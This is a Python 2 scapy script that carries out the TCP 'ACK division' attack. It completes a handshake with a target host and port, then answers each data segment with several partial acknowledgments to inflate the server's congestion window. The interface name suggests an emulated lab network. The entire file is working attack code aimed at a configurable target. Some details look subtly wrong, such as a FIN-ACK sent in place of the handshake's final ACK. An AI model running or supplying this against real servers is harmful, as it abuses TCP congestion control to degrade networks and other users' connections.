#!/usr/bin/env python
"""
This file implements the ACK division attack.
"""

import random
import argparse
import time
from scapy.all import *

parser = argparse.ArgumentParser(
    description="Attack a TCP server with the ACK division attack."
)
parser.add_argument("--dport", default=8000, type=int, help="The port to attack.")
parser.add_argument(
    "--sport", default=8000, type=int, help="The port to send the TCP packets from."
)
parser.add_argument(
    "--host", default="127.0.0.1", type=str, help="The IP address to attack."
)
args = parser.parse_args()

FIN = 0x01

DIVIDE_FACTOR = 3

if __name__ == "__main__":
    print "Making connection to %s from port %d." % (args.host, args.sport)
    print "Starting three-way handshake..."
    ip_header = IP(
        dst=args.host
    )  # An IP header that will take packets to the target machine.
    seq_no = 12345  # Our starting sequence number (not really used since we don't send data).
    window = 65535  # Advertise a large window size.

    syn = ip_header / TCP(
        sport=args.sport, dport=args.dport, flags="S", window=window
    )  # Construct a SYN packet.
    synack = sr1(syn)  # Send the SYN packet and receive a SYNACK

    ack = ip_header / TCP(
        sport=args.sport,
        dport=args.dport,
        flags="FA",
        window=window,
        ack=(synack[TCP].seq + 1),
        seq=(synack[TCP].ack),
    )  # ACK the SYNACK

    socket = conf.L2socket(iface="client-eth0")

    def handle_packet(pkt):
        data = pkt.payload.payload

        if IP not in pkt:
            return
        if TCP not in pkt:
            return
        if pkt[IP].src != args.host:
            return
        if data.sport != args.dport:
            return
        if data.dport != args.sport:
            return
        if not data.payload or len(data.payload) == 0:
            return

        add = 0
        if pkt.flags & FIN:
            add = 1

        final_ack = data.seq + len(data.payload) + add
        start_ack = data.seq

        ack_nos = list()

        ack_interval = int(len(data.payload) / DIVIDE_FACTOR)
        if ack_interval != 0:
            ack_nos = range(start_ack + ack_interval, final_ack, ack_interval)

        if final_ack not in ack_nos:
            ack_nos.append(final_ack)

        for ack_no in ack_nos:
            socket.send(
                Ether()
                / ip_header
                / TCP(
                    sport=args.sport,
                    dport=args.dport,
                    window=window,
                    flags="A",
                    ack=ack_no,
                    seq=(pkt[TCP].ack),
                )
            )

    socket.send(Ether() / ack)
    sniff(iface="client-eth0", filter="tcp and ip", prn=handle_packet, timeout=4)
